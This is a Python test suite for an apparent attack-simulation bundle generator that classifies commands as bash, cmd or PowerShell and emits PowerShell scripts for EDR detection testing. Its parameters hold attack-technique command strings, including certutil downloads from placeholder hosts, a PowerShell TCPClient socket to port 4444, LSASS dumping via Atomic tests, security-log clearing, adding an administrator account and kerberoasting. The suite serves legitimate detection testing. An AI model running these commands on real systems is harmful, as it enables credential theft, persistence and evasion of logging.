"""Platform resolution + PowerShell bundle generation (push_generator).

Every test here pins a decision that was WRONG before this change, when the
generator had zero platform awareness and emitted every scenario as bash:

  * a PowerShell-native scenario got a `.sh` that either failed `bash -n`
    (SIM-EDR-013/-017/-021) or — worse — parsed and then died at step-01 in
    front of a customer (SIM-EDR-006), which a DC reads as "XSIAM detected
    nothing";
  * ~17.5 KB of authored `platform_variants['windows']` command text across 53
    scenarios was dropped on the floor with no code path able to reach it.

The classification rules are deliberately conservative in specific directions
and the tests below pin those directions, not just the happy path.
"""
from __future__ import annotations

import pytest

from engine import push_generator as pg


# ─── code_only: narrative text is not execution ──────────────────────

class TestCodeOnly:
    def test_single_quoted_narrative_is_not_code(self):
        """The 13/14 false-positive class.

        Most scenarios that LOOK Windows-native to a naive regex are POSIX
        scenarios that `echo` a SAFE-MODE marker describing Windows tradecraft.
        Matching markers against raw text misclassifies them and would withdraw
        13 working bash bundles.
        """
        cmd = "echo '[SAFE-MODE] models reg.exe add + powershell.exe -w hidden + C:\\Windows\\Temp'"
        assert "reg.exe" not in pg.code_only(cmd)
        assert not pg.has_strong_windows_marker(cmd)
        assert pg.is_posix_shaped(cmd)

    def test_double_quoted_narrative_is_not_code(self):
        cmd = 'echo "modelling %SystemRoot%\\\\System32\\\\rundll32.exe comsvcs.dll"'
        assert not pg.has_strong_windows_marker(cmd)

    def test_heredoc_body_is_not_code(self):
        """A heredoc carries a payload (python, JSON, C). It is data."""
        cmd = "cat <<'EOF' > /tmp/note.txt\nGet-ChildItem C:\\Windows\nEOF\necho done"
        assert not pg.has_strong_windows_marker(cmd)

    def test_real_cmdlet_outside_quotes_is_code(self):
        assert pg.has_strong_windows_marker("Get-ChildItem $env:TEMP | Select-Object Name")

    def test_apostrophe_in_comment_does_not_swallow_the_command(self):
        """An unbalanced quote inside a `#` comment desynchronises a naive
        quote scanner and blanks the rest of the command — which would hide a
        real Windows marker and misroute the step to bash."""
        cmd = "# don't do this in prod\nGet-Process -Name lsass"
        assert pg.has_strong_windows_marker(cmd)


# ─── strong vs weak markers ──────────────────────────────────────────

class TestMarkers:
    def test_bare_pwsh_token_is_a_WEAK_marker(self):
        """SIM-EDR-018 step-02 verbatim: valid bash that OPTIONALLY drives pwsh
        behind a `command -v` guard. Treating `pwsh` as a strong marker is the
        difference between 0 scenarios regressing and 1 losing its only bundle.
        """
        cmd = (
            "command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command "
            "'Write-Output cortexsim-edr-018-script' || echo skipped"
        )
        assert not pg.has_strong_windows_marker(cmd)
        assert pg.is_posix_shaped(cmd)

    @pytest.mark.parametrize("cmd", [
        "Invoke-AtomicTest T1003.001 -TestNumbers 1",
        "reg.exe add HKCU\\Software\\X /v Y /d Z",
        "certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin",
        "for /L %i in (1,1,10) do @curl.exe -s http://h/ & timeout /t 3 >nul",
        "$f = Get-Item C:\\Windows\\Temp\\beacon.exe",
    ])
    def test_strong_markers(self, cmd):
        assert pg.has_strong_windows_marker(cmd)
        assert not pg.is_posix_shaped(cmd)

    def test_posix_anchor_outranks_an_incidental_windows_marker(self):
        """A bash script that manipulates a Windows artifact is still bash."""
        cmd = 'mkdir -p /tmp/stage && printf "%s" "x" > /tmp/stage/reg.exe.txt 2>/dev/null'
        assert pg.is_posix_shaped(cmd)


# ─── shell-neutral: a whitelist with a proof ─────────────────────────

class TestShellNeutral:
    def test_single_quoted_echo_round_trips(self):
        """`echo` aliases Write-Output and a single-quoted literal is literal in
        BOTH shells, so this is provably identical — not a guess."""
        assert pg.is_shell_neutral("echo '[CortexSim] marker'")
        assert pg.is_shell_neutral("echo 'a'; echo 'b'\necho 'c'")

    @pytest.mark.parametrize("cmd", [
        'echo "interpolates $HOME differently"',   # double quotes
        "printf '%s\\n' 'x'",                      # printf is not an alias
        "echo 'x' | tee /tmp/f",                   # pipeline
        "echo 'x' > /tmp/f",                       # redirect
        "echo \"$(hostname)\"",                    # substitution
        "echo 'x' && echo 'y'",                    # PS7-only operator
        "echo 'x' &",                              # backgrounding
        "",                                        # nothing to prove
    ])
    def test_rejects_anything_it_cannot_prove(self, cmd):
        assert not pg.is_shell_neutral(cmd)


# ─── Windows dialect inference ───────────────────────────────────────

class TestDialectInference:
    @pytest.mark.parametrize("cmd,expected", [
        ('cmd.exe /c "whoami & net user /domain"', "cmd"),
        ("for /L %i in (1,1,10) do @curl.exe -s http://h/ & timeout /t 3 >nul", "cmd"),
        ("certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin", "cmd"),
        ("Get-ChildItem $env:TEMP | Select-Object Name", "powershell"),
        ("avp.exe /c \"cmd.exe /e:ON /v:OFF /d /c whoami\"", "cmd"),
    ])
    def test_inference(self, cmd, expected):
        assert pg.infer_windows_shell(cmd) == expected

    # ── CONT-13: structure, not a hand-picked verb list ──────────────────
    @pytest.mark.parametrize("cmd", [
        # the four regression shapes named by the finding
        '$h="tu-node-a.cortexsim-tim.internal"; $c=[Net.Sockets.TcpClient]::new($h,443)',
        "Use-STSRoleWithSAML -PrincipalArn $idp -RoleArn $role -SAMLAssertion $b64",
        # verbs the old 28-verb list lacked
        "Clear-History",
        "Compress-Archive -Path x -DestinationPath y.zip",
        "Rename-Item a b",
        "Measure-Object",
        "Expand-Archive x.zip",
        "Format-List",
        # other PowerShell structure with no cmdlet at all
        "& /usr/bin/false",                       # statement-start call operator
        "whoami /all; net user",                  # `;` separator (cmd has none)
        "1..3 | % { $_ }",                        # range + alias block
        "Rubeus.exe kerberoast  # comment",       # `#` comment (cmd has none)
        "echo 'neutral marker'",                  # provably shell-neutral
    ])
    def test_structural_powershell(self, cmd):
        assert pg.infer_windows_shell(cmd) == "powershell"

    @pytest.mark.parametrize("cmd", [
        "for /L %i in (1,1,3) do @echo %i",
        "ipconfig /all & route print & arp -a",
        "net user x /add && net localgroup administrators x /add",
        "nltest.exe /dsgetdc:%USERDNSDOMAIN%",
        "if exist C:\\x.txt del C:\\x.txt",
        "set FOO=bar",
        "tasklist | findstr /I \"cortex traps\"",
    ])
    def test_structural_cmd(self, cmd):
        assert pg.infer_windows_shell(cmd) == "cmd"

    def test_mixed_dialect_is_refused_not_sent_to_cmd(self):
        """SIM-EDR-004 step-01 verbatim. Handed to cmd.exe (the old routing, since
        `Clear-` was not in the verb list), Clear-History fails; handed to Windows
        PowerShell 5.1, the infix `&` is a parse error and NOTHING runs."""
        cmd = "wevtutil cl Security & wevtutil cl System & Clear-History"
        assert pg.infer_windows_shell(cmd) == "mixed"
        step = {"id": "step-01", "command": "echo x", "platform_variants": {"windows": cmd}}
        res = pg.resolve_target(_scn([step]), "windows")
        assert not res.emittable
        assert res.unresolved == (("step-01", pg.REASON_MIXED_DIALECT),)
        body = pg.BundleTargetUnsatisfiable("SIM-T", "windows", res.unresolved).to_error()
        assert "MIXED_DIALECT" in body["detail"]
        assert "ONE dialect" in body["detail"]

    def test_bare_powershell_invocation_goes_through_cmd(self):
        """`powershell.exe -Command "…"` is a native invocation. Under an OUTER
        PowerShell, every `$x` inside those double quotes is interpolated to
        empty before the inner interpreter sees it (`$c=New-Object …` becomes
        `=New-Object …`); cmd.exe hands the string through literally and also
        expands the %STAGE_HOST% an author put inside it (SIM-ASM-005 step-04).
        It was classified powershell before this change."""
        assert pg.infer_windows_shell('powershell.exe -w hidden -c "curl.exe http://h/a -o x"') == "cmd"
        assert pg.infer_windows_shell(
            'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'127.0.0.1\',4444)"'
        ) == "cmd"
        assert pg.infer_windows_shell(
            'powershell.exe -NoProfile -Command "try { iwr http://%STAGE_HOST%/x } catch { }"'
        ) == "cmd"

    def test_mixed_cleanup_is_named_as_residue_not_run(self):
        scn = _scn(
            [{"id": "step-01", "command": "echo 'x'"}],
            cleanup={"commands": ["del %TEMP%\\x & Remove-Item $env:TEMP\\y"]},
        )
        res = pg.resolve_target(scn, "windows")
        assert res.cleanup == ()
        assert res.skipped_cleanup == ("del %TEMP%\\x & Remove-Item $env:TEMP\\y",)

    def test_powershell_outranks_an_embedded_cmd_call(self):
        """SIM-EDR-017 step-03 shape: a PowerShell block that shells out to cmd.

        Classifying it `cmd` because it mentions `cmd /c` would hand
        `$s = Join-Path …` to cmd.exe, which cannot parse it — recreating the
        exact defect being fixed, in the other direction.
        """
        cmd = "$s = Join-Path $env:TEMP 'stage'\ncmd.exe /c \"md $s\\386354\"\nPop-Location"
        assert pg.infer_windows_shell(cmd) == "powershell"

    def test_ambiguous_defaults_to_cmd(self):
        """`cmd /c foo.exe args` runs a bare exe invocation correctly;
        PowerShell's parser may not."""
        assert pg.infer_windows_shell("someTool.exe /flag value") == "cmd"


# ─── PUSH-11: a `%` that a .cmd file and the command line read differently ──

def _win_variant(cmd: str) -> dict:
    return _scn([{"id": "step-01", "command": "echo 'x'", "platform_variants": {"windows": cmd}}])


class TestCmdPercentContext:
    """cmd text reaches cmd.exe two ways. The beacon always writes it to a
    .cmd file; the push bundle does that for multi-line text and passes a
    single line on the command line. cmd reads `%` differently in the two:

        text                 .cmd file                   command line
        for /L %i in …       "i was unexpected"          works
        for /L %%i in …      works                       "%%i was unexpected"
        a%20b, 1..3|%{…}     the lone % is dropped       kept
        100%% done           one %                       two

    So one authored text could run on push and fail on pull, or the reverse,
    and the failure read as a missed detection. The resolver both paths share
    now refuses such a step by name instead of emitting it.
    """

    @pytest.mark.parametrize("cmd", [
        # the shape the routing test above used to pin as correct
        "for /L %i in (1,1,3) do @curl.exe -s http://h/ & timeout /t 1 >nul",
        "for /L %%i in (1,1,3) do @echo %%i",
        "for %f in (*.txt) do type %f",
        "for /F \"tokens=1\" %a in ('whoami') do echo %a",
        "curl.exe -s http://h/a%20b -o %TEMP%\\a.bin",
        "curl.exe -s \"http://h/?q=%41%42\"",
        'powershell -nop -c "1..3|%{$_}"',
        "echo 100%% done",
        "whoami /all\nfor /L %i in (1,1,2) do @echo %i\n",
    ])
    def test_context_dependent_percent_is_refused_by_name(self, cmd):
        assert pg.infer_windows_shell(cmd) == "cmd"
        assert pg.cmd_percent_is_context_dependent(cmd)
        res = pg.resolve_target(_win_variant(cmd), "windows")
        assert not res.emittable
        assert res.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
        with pytest.raises(pg.BundleTargetUnsatisfiable) as exc:
            pg.generate_powershell(_win_variant(cmd))
        assert exc.value.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)

    @pytest.mark.parametrize("cmd", [
        "certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin",
        "type C:\\Windows\\System32\\drivers\\etc\\hosts & nslookup %USERDNSDOMAIN%",
        'copy /Y "%SystemRoot%\\System32\\cmd.exe" "%SystemRoot%\\Temp\\svchost.exe"\ndir "%SystemRoot%\\Temp\\svchost.exe"\n',
        'powershell.exe -NoProfile -Command "try { iwr http://%STAGE_HOST%/x } catch { }"',
        "if exist \"%ProgramFiles(x86)%\\x\" echo found",
        "ipconfig /all & route print",
    ])
    def test_a_paired_variable_reference_is_not_refused(self, cmd):
        """`%NAME%` means the same thing in both contexts for a variable that
        is defined, and that is every `%` the corpus' emitted cmd steps carry."""
        assert not pg.cmd_percent_is_context_dependent(cmd)
        res = pg.resolve_target(_win_variant(cmd), "windows")
        assert res.emittable, res.unresolved
        assert res.steps[0].shell == "cmd"

    @pytest.mark.parametrize("cmd", [
        "1..3 | % { $_ }",
        "$x = 7 % 3; Write-Output $x",
        "Get-ChildItem | % Name",
        "Invoke-WebRequest -Uri 'http://h/a%20b' -UseBasicParsing",
    ])
    def test_a_percent_in_powershell_text_is_never_refused(self, cmd):
        """`%` is an alias and an operator in PowerShell. Only cmd text is judged."""
        res = pg.resolve_target(_win_variant(cmd), "windows")
        assert res.emittable, res.unresolved
        assert res.steps[0].shell == "powershell"

    def test_the_refusal_says_how_to_fix_it(self):
        unresolved = (("step-02", pg.REASON_CMD_PERCENT_CONTEXT),)
        body = pg.BundleTargetUnsatisfiable("SIM-T", "windows", unresolved).to_error()
        assert body["code"] == "BUNDLE_TARGET_UNSATISFIABLE"
        assert "step-02 (CMD_PERCENT_CONTEXT)" in body["detail"]
        assert "PowerShell" in body["detail"] and "%NAME%" in body["detail"]
        # The step HAS a Windows command; "declare platform_variants.windows" would mislead.
        assert "declare platform_variants.windows" not in body["detail"]

    def test_a_context_dependent_cmd_cleanup_line_is_residue_not_run(self):
        line = "for %f in (%TEMP%\\cortexsim-*) do del /q %f"
        scn = _scn([{"id": "step-01", "command": "echo 'x'"}], cleanup={"commands": [line]})
        res = pg.resolve_target(scn, "windows")
        assert res.cleanup == ()
        assert res.skipped_cleanup == (line,)

    def test_a_windows_only_primary_is_judged_too(self):
        step = {"id": "step-01", "platforms": ["windows"],
                "command": "for /L %i in (1,1,3) do @ping -n 1 %COMPUTERNAME%"}
        res = pg.resolve_target(_scn([step]), "windows")
        assert res.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)


# ─── resolve_target ──────────────────────────────────────────────────

def _scn(steps, **kw):
    base = {
        "scenario_id": "SIM-TEST-001", "name": "t", "plane": "EDR",
        "steps": steps, "cleanup": {"commands": []},
    }
    base.update(kw)
    return base


class TestResolveTarget:
    def test_posix_prefers_the_primary_command_over_a_linux_variant(self):
        """Byte-equivalence guard. Preferring the variant would rewrite the bash
        bundle of every scenario that declares one — 160 existing push-mode POV
        artifacts — for zero fidelity gain."""
        step = {"id": "step-01", "command": "echo primary",
                "platform_variants": {"linux": "echo variant"}}
        res = pg.resolve_target(_scn([step]), "posix")
        assert res.steps[0].command == "echo primary"
        assert res.steps[0].source == "primary"

    def test_posix_falls_back_to_a_linux_variant_when_primary_is_windows_native(self):
        step = {"id": "step-01", "command": "Get-Process lsass",
                "platform_variants": {"linux": "ps aux | grep sshd"}}
        res = pg.resolve_target(_scn([step]), "posix")
        assert res.emittable
        assert res.steps[0].source == "variant:linux"

    def test_posix_judges_the_command_not_the_platforms_label(self):
        """52 steps across 13 scenarios declare `platforms: [windows]` while
        carrying a working bash body. Refusing on the LABEL would withdraw 13
        bundles that run correctly today."""
        step = {"id": "step-01", "platforms": ["windows"],
                "command": "curl -s http://127.0.0.1/ -o /tmp/a.bin"}
        res = pg.resolve_target(_scn([step]), "posix")
        assert res.emittable

    def test_windows_prefers_the_declared_variant(self):
        step = {"id": "step-01", "command": "echo 'marker'",
                "platform_variants": {"windows": "Get-Process -Name lsass"}}
        res = pg.resolve_target(_scn([step]), "windows")
        assert res.steps[0].source == "variant:windows"
        assert res.steps[0].command == "Get-Process -Name lsass"

    def test_windows_uses_a_native_primary_when_the_step_is_windows_only(self):
        step = {"id": "step-01", "platforms": ["windows"],
                "command": "Invoke-AtomicTest T1003.001 -TestNumbers 1"}
        res = pg.resolve_target(_scn([step]), "windows")
        assert res.emittable and res.steps[0].source == "primary"

    def test_windows_promotes_a_provably_neutral_command(self):
        step = {"id": "step-01", "command": "echo '[CortexSim] stitch marker'"}
        res = pg.resolve_target(_scn([step]), "windows")
        assert res.steps[0].source == "neutral"
        assert res.steps[0].shell == "powershell"

    def test_windows_unresolved_names_the_step_and_reason(self):
        steps = [
            {"id": "step-01", "command": "echo 'ok'"},
            {"id": "step-02", "command": "curl -s http://h/ -o /tmp/x"},
        ]
        res = pg.resolve_target(_scn(steps), "windows")
        assert not res.emittable
        assert res.unresolved == (("step-02", pg.REASON_WINDOWS_UNAVAILABLE),)

    def test_a_scenario_spanning_both_platforms_still_emits_posix(self):
        """Per-TARGET refusal, never per-scenario refusal."""
        steps = [
            {"id": "step-01", "command": "curl -s http://h/ -o /tmp/x"},
            {"id": "step-02", "platforms": ["windows"], "command": "Get-Process lsass"},
        ]
        scn = _scn(steps)
        assert pg.emittable_targets(scn) == ()
        steps[1]["platform_variants"] = {"linux": "ps aux"}
        assert pg.emittable_targets(scn) == ("posix",)

    def test_emittable_targets_orders_posix_first(self):
        step = {"id": "step-01", "command": "echo 'marker'"}
        assert pg.emittable_targets(_scn([step])) == ("posix", "windows")

    def test_unknown_target_is_a_programming_error(self):
        with pytest.raises(ValueError):
            pg.resolve_target(_scn([{"id": "s", "command": "true"}]), "solaris")


class TestCleanupResolution:
    def test_posix_only_cleanup_is_skipped_and_named_on_windows(self):
        scn = _scn(
            [{"id": "step-01", "command": "echo 'x'"}],
            cleanup={"commands": ["rm -f /tmp/stage", "Remove-Item $env:TEMP\\x -Force"]},
        )
        res = pg.resolve_target(scn, "windows")
        assert res.skipped_cleanup == ("rm -f /tmp/stage",)
        assert [c for c, _ in res.cleanup] == ["Remove-Item $env:TEMP\\x -Force"]

    def test_cleanup_never_gates_emittability(self):
        """A bundle that runs its steps and warns on teardown still delivers the
        signal the POV needs; withdrawing it over cleanup would orphan it."""
        scn = _scn(
            [{"id": "step-01", "command": "echo 'x'"}],
            cleanup={"commands": ["rm -rf /tmp/stage"]},
        )
        assert "windows" in pg.emittable_targets(scn)


# ─── generate_powershell ─────────────────────────────────────────────

class TestGeneratePowerShell:
    def test_refuses_an_unsatisfiable_scenario_with_a_structured_error(self):
        scn = _scn([
            {"id": "step-01", "command": "echo 'ok'"},
            {"id": "step-02", "command": "curl -s http://h/ -o /tmp/x"},
        ])
        with pytest.raises(pg.BundleTargetUnsatisfiable) as exc:
            pg.generate_powershell(scn)
        body = exc.value.to_error()
        assert set(body) == {"error", "code", "detail"}
        assert body["code"] == "BUNDLE_TARGET_UNSATISFIABLE"
        # Actionable: names the step, the reason, and the fix.
        assert "step-02" in body["detail"]
        assert pg.REASON_WINDOWS_UNAVAILABLE in body["detail"]
        assert "platform_variants.windows" in body["detail"]
        assert "step-01" not in body["detail"]

    def test_emits_the_windows_variant_not_the_posix_primary(self):
        """The whole point: authored Windows command text reaches the host."""
        scn = _scn([{
            "id": "step-01",
            "command": "curl -s http://127.0.0.1/update.bin -o /tmp/a.bin",
            "platform_variants": {"windows": "certutil.exe -urlcache -split -f http://127.0.0.1/update.bin %TEMP%\\a.bin"},
        }])
        out = pg.generate_powershell(scn)
        assert "certutil.exe -urlcache -split" in out
        assert "curl -s http://127.0.0.1/update.bin -o /tmp/a.bin" not in out

    def test_routes_a_cmd_batch_variant_through_cmd_not_powershell(self):
        """Pasting cmd text into a .ps1 yields a script that PARSES and then
        fails at runtime — the same defect, mirrored. (This test used to pin
        `for /L %i …`, a shape that only ran in one of the two contexts cmd
        text reaches; see TestCmdPercentContext.)"""
        scn = _scn([{
            "id": "step-01", "command": "echo 'x'",
            "platform_variants": {"windows": "ping -n 3 127.0.0.1 >nul & curl.exe -s http://h/ -o %TEMP%\\a.bin"},
        }])
        out = pg.generate_powershell(scn)
        assert "-Shell 'cmd'" in out
        assert "-Shell 'powershell'" not in out

    def test_carries_a_utf8_bom(self):
        """Windows PowerShell 5.1 reads a BOM-less file as ANSI and mangles the
        em-dashes the corpus embeds INSIDE marker strings."""
        scn = _scn([{"id": "step-01", "command": "echo 'marker — with em dash'"}])
        assert pg.generate_powershell(scn).startswith("\ufeff")

    @pytest.mark.parametrize("terminator", ["'@", "\u2018@", "\u2019@", "\u201a@", "\u201b@"])
    def test_here_string_falls_back_when_the_payload_would_terminate_it(self, terminator):
        """A line starting with ANY single-quote-class character followed by `@`
        closes a literal here-string early — PowerShell treats U+2018..U+201B as
        single quotes, so a pasted `’@` forges the terminator exactly as `'@`
        does. The fallback is a single-quoted literal with every quote doubled."""
        lit = pg._ps_literal(f"Write-Output 'a'\n{terminator} closes it\nWrite-Output 'b'")
        assert not lit.startswith("@'"), "a forgeable here-string terminator was not detected"
        assert lit.startswith("'") and lit.endswith("'")
        assert f"{terminator[0]}{terminator[0]}@ closes it" in lit

    def test_here_string_kept_when_no_line_can_terminate_it(self):
        assert pg._ps_literal("Write-Output 'a'\n x '@ mid-line is fine").startswith("@'\n")

    @pytest.mark.parametrize("quote", ["'", "\u2018", "\u2019", "\u201a", "\u201b"])
    def test_single_quoted_literals_double_every_quote_class_character(self, quote):
        assert pg._ps_sq(f"don{quote}t") == f"'don{quote}{quote}t'"
        assert pg._ps_inline(f"don{quote}t") == f"'don{quote}{quote}t'"

    def test_step_text_never_appears_as_code(self):
        """Step bodies travel base64-encoded and are decoded at run time, so no
        quoting layer surrounds author text — and the readable copy is a comment."""
        import base64  # noqa: PLC0415

        body = "Write-Output 'a'\n'@\nWrite-Output 'b'"
        out = pg.generate_powershell(_scn([{"id": "step-01", "platforms": ["windows"], "command": body}]))
        literal = out.split("$CsCmd_01 = '", 1)[1].split("'", 1)[0]
        assert base64.b64decode(literal).decode("utf-8") == body
        for line in body.split("\n"):
            assert f"#   | {line}\n" in out

    def test_identity_degradation_is_surfaced_per_step(self):
        scn = _scn([{"id": "step-01", "identity": "www-data", "command": "echo 'x'"}])
        out = pg.generate_powershell(scn)
        assert "cortexsim-identity-degraded" in out
        assert "-Identity 'www-data'" in out

    def test_degraded_identities_are_listed_in_the_header_before_anything_runs(self):
        """A DC reading the .ps1 learns which steps cannot reach their declared
        identity, and that the exit code will not say so."""
        scn = _scn([
            {"id": "step-01", "identity": "www-data", "command": "echo 'x'"},
            {"id": "step-02", "identity": "root", "command": "echo 'x'"},
            {"id": "step-03", "identity": "direct", "command": "echo 'x'"},
            {"id": "step-04", "command": "echo 'x'"},
            {"id": "step-05", "identity": "Administrator", "command": "echo 'x'"},
            {"id": "step-06", "identity": "svc-backup", "command": "echo 'x'"},
        ])
        out = pg.generate_powershell(scn)
        header = out.split("$ErrorActionPreference", 1)[0]
        block = header.split("# Identity DEGRADED", 1)[1].split("# RESIDUE", 1)[0]
        listed = [ln.strip("# \n") for ln in block.splitlines() if ln.startswith("#     ")]
        assert listed == ["step-01 (identity www-data)", "step-06 (identity svc-backup)"]
        assert "does not change the exit code" in " ".join(header.replace("#", " ").split())
        assert "IDENTITY column" in header
        assert "$CortexSimDegradedSteps = @('step-01 (www-data)', 'step-06 (svc-backup)')" in out

    def test_a_bundle_with_no_degraded_identity_says_none(self):
        scn = _scn([{"id": "step-01", "identity": "root", "command": "echo 'x'"},
                    {"id": "step-02", "command": "echo 'x'"}])
        out = pg.generate_powershell(scn)
        header = out.split("$ErrorActionPreference", 1)[0]
        block = header.split("# Identity DEGRADED", 1)[1].split("# RESIDUE", 1)[0]
        assert "#     (none)\n" in block
        assert "$CortexSimDegradedSteps = @()" in out

    def test_the_header_and_the_harness_classify_identity_the_same_way(self):
        """The header list is computed in Python, the run-time mode in
        PowerShell (Resolve-CsIdentity). Both must read the same allowlist, or
        the header promises one thing and the table shows another."""
        from engine.identity_spec import direct_identities  # noqa: PLC0415

        ids = ["", "direct", "DIRECT", "root", "Root", "container-runtime", "administrator",
               "SYSTEM", "www-data", "user", "svc-backup", "postgres"]
        scn = _scn([{"id": f"step-{i:02d}", "identity": ident, "command": "echo 'x'"}
                    for i, ident in enumerate(ids, start=1)])
        out = pg.generate_powershell(scn)
        elevated = ({d.lower() for d in direct_identities()} | {"administrator", "system"}) - {"direct"}
        want = [
            f"step-{i:02d} ({ident})" for i, ident in enumerate(ids, start=1)
            if ident.strip() and ident.lower() != "direct" and ident.lower() not in elevated
        ]
        assert want == ["step-09 (www-data)", "step-10 (user)", "step-11 (svc-backup)", "step-12 (postgres)"]
        literal = "@(" + ", ".join("'" + w + "'" for w in want) + ")"
        assert f"$CortexSimDegradedSteps = {literal}" in out
        # ...and the PowerShell side still branches on exactly those names.
        assert "$CortexSimDirectIdentities -contains $lower -or $lower -eq 'administrator' -or $lower -eq 'system'" in out

    def test_direct_identity_allowlist_comes_from_the_canonical_spec(self):
        """Push-bash, push-PowerShell and the Go beacon must not grow three
        copies of the allowlist (GAP-PUSH-001)."""
        from engine.identity_spec import direct_identities  # noqa: PLC0415

        scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
        out = pg.generate_powershell(scn)
        rendered = out.split("$CortexSimDirectIdentities = @(")[1].split(")")[0]
        assert rendered == ", ".join(f"'{i.lower()}'" for i in direct_identities())

    def test_refuses_to_generate_if_the_spec_ever_claims_windows_impersonation(self, monkeypatch):
        """The generator emits no impersonation wrapper. If the spec flips,
        emitting the degraded harness anyway would be exactly the silent lie
        both execution paths exist to prevent."""
        import engine.identity_spec as ispec  # noqa: PLC0415

        monkeypatch.setattr(ispec, "supports_impersonation", lambda p: True)
        scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
        with pytest.raises(NotImplementedError, match="no impersonation wrapper"):
            pg.generate_powershell(scn)

    def test_cardinal_invariant_no_install_no_callback(self):
        scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
        out = pg.generate_powershell(scn)
        # Comment lines are excluded: the header DOCUMENTS the invariant
        # ("no Install-Module, no PSGallery"), which is not a violation of it.
        code = "\n".join(
            ln for ln in out.split("\n") if not ln.lstrip().startswith("#")
        )
        for forbidden in ("Install-Module", "Set-ExecutionPolicy ", "Invoke-RestMethod", "/api/"):
            assert forbidden not in code, f"{forbidden} breaks the self-contained invariant"
        # -ExecutionPolicy Bypass on a CHILD process is fine and required;
        # mutating machine policy is not.
        assert "-ExecutionPolicy Bypass -File" in code

    def test_no_ps7_only_operators_in_generated_code(self):
        """Server 2016/2019/2022 and Win10/11 ship Windows PowerShell 5.1."""
        scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
        # Generated CODE only — payload literals may legitimately contain `&&`.
        # (tests/engine/test_push_ps_execution.py proves the same by AST walk.)
        code = pg.generate_powershell(scn).split("$CsCmd_01")[0]
        for op in ("&&", "||", "??"):
            assert op not in code

    def test_step_plan_is_documented_in_the_header(self):
        """The header is what a DC screenshots into the POV report; an inferred
        dialect must be visible there so an author can pin it."""
        scn = _scn([{
            "id": "step-01", "command": "echo 'x'",
            "platform_variants": {"windows": 'cmd.exe /c "whoami"'},
        }])
        out = pg.generate_powershell(scn)
        assert "# Resolved execution plan" in out
        assert "step-01: variant:windows -> cmd" in out
        assert "dialect inferred: cmd" in out

    def test_no_unresolved_placeholders(self):
        import re  # noqa: PLC0415

        scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
        assert not re.findall(r"@@[A-Z0-9_]+@@", pg.generate_powershell(scn))

    def test_unbound_template_field_fails_loudly(self):
        """A silent placeholder leak is how `{scenario_id}` ends up in a bundle
        a customer runs."""
        with pytest.raises(KeyError, match="NOPE"):
            pg._render("x @@NOPE@@ y", {"SCENARIO_ID": "a"})

    def test_render_is_single_pass(self):
        """An injected value containing a placeholder must not be re-expanded."""
        out = pg._render("@@A@@|@@B@@", {"A": "@@B@@", "B": "z"})
        assert out == "@@B@@|z"


class TestBashUnchanged:
    def test_generate_bash_still_emits_the_variant_free_primary(self):
        """Regression guard for the byte-equivalence property proved corpus-wide:
        the POSIX path must not start preferring platform_variants."""
        scn = _scn([{"id": "step-01", "command": "echo primary",
                     "platform_variants": {"linux": "echo variant"}}])
        out = pg.generate_bash(scn)
        assert "echo primary" in out and "echo variant" not in out

    def test_generate_bash_still_starts_with_a_shebang(self):
        scn = _scn([{"id": "step-01", "command": "true"}])
        assert pg.generate_bash(scn).splitlines()[0].startswith("#!")


def _powershell_or_skip() -> str:
    import os  # noqa: PLC0415
    import shutil  # noqa: PLC0415
    import sys  # noqa: PLC0415

    exe = (shutil.which("powershell.exe") if sys.platform == "win32" else None) or shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CORTEXSIM_REQUIRE_POWERSHELL") == "1" or os.environ.get("CI"):
            pytest.fail("PowerShell is required here (CI or CORTEXSIM_REQUIRE_POWERSHELL=1)")
        pytest.skip("no PowerShell interpreter on PATH")
    return exe


def test_a_failing_step_is_reported_as_failed_when_executed(tmp_path):
    """A failing PowerShell step must not log "completed successfully" — proven
    by RUNNING the bundle, not by grepping it.

    This replaces ``test_step_script_forces_terminating_errors``, which asserted
    only that the substring ``$ErrorActionPreference = 'Stop'`` appeared in the
    bundle. It did — inside a DOUBLE-quoted string, so the harness's own value
    expanded in and every step file began ``Continue = 'Stop'``: the
    ``continue`` keyword, which ended the step with exit 0 before its TTP line
    ran. The substring test passed with every PowerShell step a no-op. The full
    execution guard is tests/engine/test_push_ps_execution.py.
    """
    import os  # noqa: PLC0415
    import subprocess  # noqa: PLC0415
    import sys  # noqa: PLC0415

    exe = _powershell_or_skip()
    scn = _scn([{
        "id": "step-01",
        "command": "echo posix",
        "platforms": ["windows"],
        "platform_variants": {"windows": "Get-Process -Name cortexsim-nosuchprocess-xyz"},
    }])
    path = tmp_path / "b.ps1"
    path.write_text(pg.generate_powershell(scn), encoding="utf-8")
    env = {k: v for k, v in os.environ.items() if not k.startswith("CORTEXSIM_")}
    env.update({"TEMP": str(tmp_path), "TMP": str(tmp_path)})
    args = [exe, "-NoProfile", "-NonInteractive"]
    if sys.platform == "win32":
        args += ["-ExecutionPolicy", "Bypass"]
    proc = subprocess.run(
        args + ["-File", str(path)], env=env, capture_output=True, text=True,
        timeout=120, encoding="utf-8", errors="replace", cwd=str(tmp_path),
    )
    out = proc.stdout + proc.stderr
    assert "Step step-01 completed successfully" not in out, out
    assert "cortexsim-step-result step=step-01 outcome=ran-nonzero exit=1" in out, out
    assert proc.returncode == 1, out
